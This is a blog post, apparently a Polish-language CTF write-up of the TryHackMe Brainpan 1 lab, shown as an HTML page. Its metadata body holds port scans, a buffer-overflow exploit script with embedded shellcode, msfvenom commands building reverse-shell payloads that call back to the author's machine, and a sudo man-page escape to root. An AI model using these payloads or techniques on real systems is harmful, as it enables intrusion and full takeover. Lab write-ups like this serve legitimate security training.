@@ -1,0 +1,625 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Brainpan 1 | Mateusz Suszczyk</title>
+<meta name="keywords" content="Linux, Easy" />
+<meta name="description" content="Reverse engineer a Windows executable, find a buffer overflow and exploit it on a Linux machine.">
+<meta name="author" content="Mateusz Suszczyk">
+<link rel="canonical" href="https://suszczyk.github.io/posts/tryhackme/brainpan-1/" />
+<link crossorigin="anonymous" href="../../../assets/css/stylesheet.min.05ec22396353f5838fc267c8a7e9d490b0f9679d599623d1abcb52b3a80b2af6.css" integrity="sha256-BewiOWNT9YOPwmfIp&#43;nUkLD5Z51ZliPRq8tSs6gLKvY=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="../../../assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js" integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5&#43;kdJvBz5iKbt6B5PJI="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://suszczyk.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://suszczyk.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://suszczyk.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://suszczyk.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://suszczyk.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<meta name="generator" content="Hugo 0.92.2" />
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="Brainpan 1" />
+<meta property="og:description" content="Reverse engineer a Windows executable, find a buffer overflow and exploit it on a Linux machine." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://suszczyk.github.io/posts/tryhackme/brainpan-1/" />
+<meta property="og:image" content="https://suszczyk.github.io/thumbnails/brainpan.png" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-09-07T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2022-09-07T00:00:00&#43;00:00" />
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://suszczyk.github.io/thumbnails/brainpan.png" />
+<meta name="twitter:title" content="Brainpan 1"/>
+<meta name="twitter:description" content="Reverse engineer a Windows executable, find a buffer overflow and exploit it on a Linux machine."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Posts",
+      "item": "https://suszczyk.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "Brainpan 1",
+      "item": "https://suszczyk.github.io/posts/tryhackme/brainpan-1/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Brainpan 1",
+  "name": "Brainpan 1",
+  "description": "Reverse engineer a Windows executable, find a buffer overflow and exploit it on a Linux machine.",
+  "keywords": [
+    "Linux", "Easy"
+  ],
+  "articleBody": "Adres IP maszyny od TryHackMe: 10.10.167.88 Adres IP Windowsa: 192.168.2.154 Adres IP mojego Linuxa: 192.168.2.128\n NMap ┌[parrot@parrot]─[~/tryhackme/bufferoverflow] [12/291] └╼[★ ]$nmap -sC -sV 10.10.167.88 -p- Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-07 02:40 CEST Nmap scan report for 10.10.167.88 Host is up (0.21s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 9999/tcp open abyss? | fingerprint-strings: | NULL: | _| _| | _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| | _|_| _| _| _| _| _| _| _| _| _| _| _| | _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _| | [________________________ WELCOME TO BRAINPAN _________________________] |_ ENTER THE PASSWORD 10000/tcp open http SimpleHTTPServer 0.6 (Python 2.7.3) |_http-title: Site doesn't have a title (text/html). |_http-server-header: SimpleHTTP/0.6 Python/2.7.3 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port9999-TCP:V=7.92%I=7%D=9/7%Time=6317EBD2%P=x86_64-pc-linux-gnu%r(NUL SF:L,298,\"_\\|\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_\\|\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\n_\\|_\\|_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|_\\|\\x20\\x20\\x20\\x20_\\|_\\|_\\|\\ SF:x20\\x20\\x20\\x20\\x20\\x20_\\|_\\|_\\|\\x20\\x20\\x20\\x20_\\|_\\|_\\|\\x20\\x20\\x20\\x SF:20\\x20\\x20_\\|_\\|_\\|\\x20\\x20_\\|_\\|_\\|\\x20\\x20\\n_\\|\\x20\\x20\\x20\\x20_\\|\\x2 SF:0\\x20_\\|_\\|\\x20\\x20\\x20\\x20\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x2 SF:0\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x2 SF:0\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\n_\\|\\x20\\x20\\x20\\x20_\\|\\ SF:x20\\x20_\\|\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x2 SF:0_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x2 SF:0_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\n_\\|_\\|_\\|\\x20\\x2 SF:0\\x20\\x20_\\|\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_\\|_\\|_\\|\\x20\\x20_\\ SF:|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|_\\|_\\|\\x20\\x20\\x20\\x20\\x20\\x2 SF:0_\\|_\\|_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20_\\|\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\x20_\\|\\n\\n\\[________________________\\x20WELCOME\\x20TO\\x20BRAINPAN\\x2 SF:0_________________________\\]\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20ENTER\\x2 SF:0THE\\x20PASSWORD\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\n\\n\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\");  Port 9999 W kodzie źródłowym nic nie było.\n Port 10000 FeroxBuster ┌[parrot@parrot]─[~/tryhackme/brainpan] └╼[★ ]$feroxbuster -w /opt/SecLists/Discovery/Web-Content/common.txt -u http://10.10.167.88:10000 -d 1 -r -t 50 ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \"epi\" Risher 🤓 ver: 2.3.3 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.10.167.88:10000 🚀 Threads │ 50 📖 Wordlist │ /opt/SecLists/Discovery/Web-Content/common.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.3.3 💉 Config File │ /etc/feroxbuster/ferox-config.toml 📍 Follow Redirects │ true 🔃 Recursion Depth │ 1 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Cancel Menu™ ────────────────────────────────────────────────── 200 11l 24w 230c http://10.10.167.88:10000/bin/ 200 8l 14w 215c http://10.10.167.88:10000/index.html [####################] - 1m 4697/4697 0s found:2 errors:68  [####################] - 1m 4697/4697 50/s http://10.10.153.181:10000 Pobrałem .exe i zaczynam działanie na Windowsie.\n Testy na Windowsie Faktycznie widzimy otwarty port 9999 jak na oryginalnej maszynie.\nFuzzer ┌[parrot@parrot]─[~/tryhackme/bufferoverflow] └╼[★ ]$python3 fuzzer.py Fuzzing with 100 bytes Fuzzing with 200 bytes Fuzzing with 300 bytes Fuzzing with 400 bytes Fuzzing with 500 bytes Fuzzing with 600 bytes Fuzzing crashed at 600 bytes Zatem tworzę nieco dłuższy pattern o długości 800.\n┌[parrot@parrot]─[~/tryhackme/bufferoverflow] └╼[★ ]$/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 800 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba  Ustawiam w konsoli:\n!mona findmsp -distance 800\nJest komunikat:\nEIP contains normal pattern : 0x35724134 (offset 524) \nZ tego wynika, że zmienna offset = 524. Ustawiam również payload=\"\" oraz retn = \"BBBB\". EIP po crashu powinien zwrócić 42424242.\nTak się stało. Wychodzi na to, że jedyny bad char to \\x00.\n!mona jmp -r esp -cpb \"\\x00\"\nAdres pointera to : 311712F3. Do zmiennej retn odwracam ten adres.\nretn=\\xf3\\x12\\x17\\x31\nWygenerowałem shellcode na Windowsa.\n┌[parrot@parrot]─[~/tryhackme/bufferoverflow] └╼[★ ]$msfvenom -p windows/shell_reverse_tcp LHOST=192.168.2.128 LPORT=4445 EXITFUNC=thread -b \"\\x00\" -f c Finalny exploit.py\nimport socket ip = \"10.10.167.88\" port = 9999 prefix = \"\" offset = 524 overflow = \"A\" * offset retn = \"\\xf3\\x12\\x17\\x31\" padding = \"\\x90\" * 16 payload=(\"\\xd9\\xc0\\xbd\\x24\\xa6\\x05\\x04\\xd9\\x74\\x24\\xf4\\x58\\x29\\xc9\\xb1\" \"\\x12\\x31\\x68\\x17\\x03\\x68\\x17\\x83\\xcc\\x5a\\xe7\\xf1\\x3d\\x78\\x1f\" \"\\x1a\\x6e\\x3d\\xb3\\xb7\\x92\\x48\\xd2\\xf8\\xf4\\x87\\x95\\x6a\\xa1\\xa7\" \"\\xa9\\x41\\xd1\\x81\\xac\\xa0\\xb9\\x1b\\x47\\x87\\x4d\\x74\\x55\\x27\\xbc\" \"\\xd8\\xd0\\xc6\\x0e\\x86\\xb2\\x59\\x3d\\xf4\\x30\\xd3\\x20\\x37\\xb6\\xb1\" \"\\xca\\xa6\\x98\\x46\\x62\\x5f\\xc8\\x87\\x10\\xf6\\x9f\\x3b\\x86\\x5b\\x29\" \"\\x5a\\x96\\x57\\xe4\\x1d\") postfix = \"\" buffer = prefix + overflow + retn + padding + payload + postfix s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((ip, port)) print(\"Sending evil buffer...\") s.send(bytes(buffer + \"\\r\\n\", \"latin-1\")) print(\"Done!\") except: print(\"Could not connect.\") Świetnie, działa. Teraz tylko zmieniam payload i adres IP na ten z VPN:\nmsfvenom -p linux/x86/shell_reverse_tcp LHOST=10.8.212.116 LPORT=4444 EXITFUNC=thread -b \"\\x00\" -f c  Privilege Escalation sudo -l\nsudo -l Matching Defaults entries for puck on this host: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User puck may run the following commands on this host: (root) NOPASSWD: /home/anansi/bin/anansi_util sudo /home/anansi/bin/anansi_util Usage: /home/anansi/bin/anansi_util [action] Where [action] is one of: - network - proclist - manual [command] 3 opcja jest nietypowa, postanowiłem popróbować różnych trików i udało mi się uzyskać roota, ponieważ dostajemy dostęp do man, a z niego możemy “wyjść” poprzez !/bin/bash. Ponieważ włączamy binarke z sudo, otrzymamy roota.\nsudo /home/anansi/bin/anansi_util manual whoami [111/111] No manual entry for manual WARNING: terminal is not fully functional !/bin/bash !/bin/bash id uid=0(root) gid=0(root) groups=0(root)  Root proof ",
+  "wordCount" : "681",
+  "inLanguage": "en",
+  "image":"https://suszczyk.github.io/thumbnails/brainpan.png","datePublished": "2022-09-07T00:00:00Z",
+  "dateModified": "2022-09-07T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Mateusz Suszczyk"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://suszczyk.github.io/posts/tryhackme/brainpan-1/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Mateusz Suszczyk",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://suszczyk.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://suszczyk.github.io" accesskey="h" title="Mateusz Suszczyk (Alt + H)">Mateusz Suszczyk</a>
+            <span class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </span>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://suszczyk.github.io/archives/" title="Archiwum">
+                    <span>Archiwum</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://suszczyk.github.io/categories/" title="Kategorie">
+                    <span>Kategorie</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://suszczyk.github.io/tags/" title="Tagi">
+                    <span>Tagi</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://suszczyk.github.io/search/" title="Szukaj">
+                    <span>Szukaj</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://suszczyk.github.io">Home</a>&nbsp;»&nbsp;<a href="https://suszczyk.github.io/posts/">Posts</a></div>
+    <h1 class="post-title">
+      Brainpan 1
+    </h1>
+    <div class="post-meta"><span title='2022-09-07 00:00:00 +0000 UTC'>September 7, 2022</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;Mateusz Suszczyk
+
+</div>
+  </header> 
+<figure class="entry-cover"><img loading="lazy" src="https://suszczyk.github.io/thumbnails/brainpan.png" alt="">
+        
+</figure><div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#nmap" aria-label="NMap">NMap</a><ul>
+                        
+                <li>
+                    <a href="#port-9999" aria-label="Port 9999">Port 9999</a></li>
+                <li>
+                    <a href="#port-10000" aria-label="Port 10000">Port 10000</a><ul>
+                        
+                <li>
+                    <a href="#feroxbuster" aria-label="FeroxBuster">FeroxBuster</a></li></ul>
+                </li></ul>
+                </li>
+                <li>
+                    <a href="#testy-na-windowsie" aria-label="Testy na Windowsie">Testy na Windowsie</a><ul>
+                        
+                <li>
+                    <a href="#fuzzer" aria-label="Fuzzer">Fuzzer</a></li></ul>
+                </li>
+                <li>
+                    <a href="#privilege-escalation" aria-label="Privilege Escalation">Privilege Escalation</a><ul>
+                        
+                <li>
+                    <a href="#root-proof" aria-label="Root proof">Root proof</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p>Adres IP maszyny od TryHackMe: <code>10.10.167.88</code>
+Adres IP Windowsa: <code>192.168.2.154</code>
+Adres IP mojego Linuxa: <code>192.168.2.128</code></p>
+<hr>
+<h1 id="nmap">NMap<a hidden class="anchor" aria-hidden="true" href="#nmap">#</a></h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌<span style="color:#f92672">[</span>parrot@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/tryhackme/bufferoverflow<span style="color:#f92672">]</span>                                                                                                                                         <span style="color:#f92672">[</span>12/291<span style="color:#f92672">]</span>
+└╼<span style="color:#f92672">[</span>★ <span style="color:#f92672">]</span>$nmap -sC -sV 10.10.167.88 -p-                                                                                                                                                         
+Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-09-07 02:40 CEST                                                                                                                              
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.167.88                                                                                                                                                            
+Host is up <span style="color:#f92672">(</span>0.21s latency<span style="color:#f92672">)</span>.                                                                                                                                                                   
+Not shown: <span style="color:#ae81ff">65533</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>                                                                                                                                              
+PORT      STATE SERVICE VERSION                                                                                                                                                               
+9999/tcp  open  abyss?                                                                                                                                                                        
+| fingerprint-strings:                                                                                                                                                                        
+|   NULL:                                                                                                                                                                                     
+|     _| _|                                                                                                                                                                                   
+|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_|                                                                                                                                       
+|     _|_| _| _| _| _| _| _| _| _| _| _| _|                                                                                                                                                   
+|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
+|     <span style="color:#f92672">[</span>________________________ WELCOME TO BRAINPAN _________________________<span style="color:#f92672">]</span>
+|_    ENTER THE PASSWORD
+10000/tcp open  http    SimpleHTTPServer 0.6 <span style="color:#f92672">(</span>Python 2.7.3<span style="color:#f92672">)</span>
+|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>text/html<span style="color:#f92672">)</span>.
+|_http-server-header: SimpleHTTP/0.6 Python/2.7.3
+<span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port9999-TCP:V<span style="color:#f92672">=</span>7.92%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>9/7%Time<span style="color:#f92672">=</span>6317EBD2%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>NUL
+SF:L,298,<span style="color:#e6db74">&#34;_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+</span><span style="color:#e6db74">SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20\
+</span><span style="color:#e6db74">SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+</span><span style="color:#e6db74">SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+</span><span style="color:#e6db74">SF:0\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|_\|\
+</span><span style="color:#e6db74">SF:x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x
+</span><span style="color:#e6db74">SF:20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_\|\x2
+</span><span style="color:#e6db74">SF:0\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x2
+</span><span style="color:#e6db74">SF:0\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x2
+</span><span style="color:#e6db74">SF:0\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x20_\|\
+</span><span style="color:#e6db74">SF:x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x2
+</span><span style="color:#e6db74">SF:0_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x2
+</span><span style="color:#e6db74">SF:0_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x20\x2
+</span><span style="color:#e6db74">SF:0\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20_\
+</span><span style="color:#e6db74">SF:|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x20\x2
+</span><span style="color:#e6db74">SF:0_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20\x20\
+</span><span style="color:#e6db74">SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+</span><span style="color:#e6db74">SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+</span><span style="color:#e6db74">SF:0\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+</span><span style="color:#e6db74">SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x20
+</span><span style="color:#e6db74">SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+</span><span style="color:#e6db74">SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+</span><span style="color:#e6db74">SF:20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINPAN\x2
+</span><span style="color:#e6db74">SF:0_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+</span><span style="color:#e6db74">SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENTER\x2
+</span><span style="color:#e6db74">SF:0THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+</span><span style="color:#e6db74">SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\n\x
+</span><span style="color:#e6db74">SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+</span><span style="color:#e6db74">SF:x20\x20\x20\x20\x20\x20\x20\x20&gt;&gt;\x20&#34;</span><span style="color:#f92672">)</span>;
+</code></pre></div><hr>
+<h2 id="port-9999">Port 9999<a hidden class="anchor" aria-hidden="true" href="#port-9999">#</a></h2>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220905013440.png" alt=""  />
+</p>
+<p>W kodzie źródłowym nic nie było.</p>
+<hr>
+<h2 id="port-10000">Port 10000<a hidden class="anchor" aria-hidden="true" href="#port-10000">#</a></h2>
+<h3 id="feroxbuster">FeroxBuster<a hidden class="anchor" aria-hidden="true" href="#feroxbuster">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌<span style="color:#f92672">[</span>parrot@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/tryhackme/brainpan<span style="color:#f92672">]</span>
+└╼<span style="color:#f92672">[</span>★ <span style="color:#f92672">]</span>$feroxbuster -w /opt/SecLists/Discovery/Web-Content/common.txt -u http://10.10.167.88:10000 -d <span style="color:#ae81ff">1</span> -r -t <span style="color:#ae81ff">50</span>          
+
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__<span style="color:#f92672">)</span> |__<span style="color:#f92672">)</span> | /  <span style="color:#e6db74">`</span>    /  <span style="color:#ae81ff">\ \_</span>/ | |  <span style="color:#ae81ff">\ </span>|__
